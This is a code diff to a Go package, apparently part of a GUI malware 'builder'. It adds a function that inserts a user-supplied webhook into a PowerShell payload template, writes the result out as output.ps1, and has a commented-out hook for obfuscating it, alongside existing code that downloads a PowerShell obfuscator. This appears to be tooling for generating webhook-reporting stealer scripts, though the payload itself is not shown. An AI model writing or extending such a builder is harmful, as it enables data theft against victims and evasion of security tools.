@@ -2,10 +2,42 @@ package powershell
 
 import (
 	"archive/zip"
+	"fmt"
 	"io"
 	"net/http"
 	"os"
+	"strings"
+
+	"builder/modules/options/utils"
+
+	"fyne.io/fyne/v2"
 )
+
+func CompilePowershellFile(a fyne.App, webhook string, obfuscate bool) {
+	cwd, err := os.Getwd()
+	if err != nil {
+		fmt.Println(err)
+	}
+	if !(utils.TestWebhook(a, webhook)) {
+		return
+	}
+	ps1Code := utils.GetPowershellCode()
+	ps1Code = strings.Replace(ps1Code, "YOUR_WEBHOOK_HERE", webhook, -1)
+	err = os.WriteFile("output.ps1", []byte(ps1Code), 0644)
+	if err != nil {
+		fmt.Println(err)
+	} else {
+		//if obfuscate {
+		//	utils.MakeSuccessMessage(a, "test")
+		//	err = obfuscateCode("output.ps1")
+		//	if err != nil {
+		//		utils.MakeErrorMessage(a, "An error occured while obfuscating the code"+err.Error())
+		//		return
+		//	}
+		//}
+		utils.MakeSuccessMessage(a, "Compiled ps1 file successfully! Location is at "+cwd+"\\output.ps1")
+	}
+}
 
 func GetObfuscator() string {
 	obfuscatorUrl := "https://github.com/KDot227/Somalifuscator-Powershell-Edition/archive/refs/heads/main.zip"
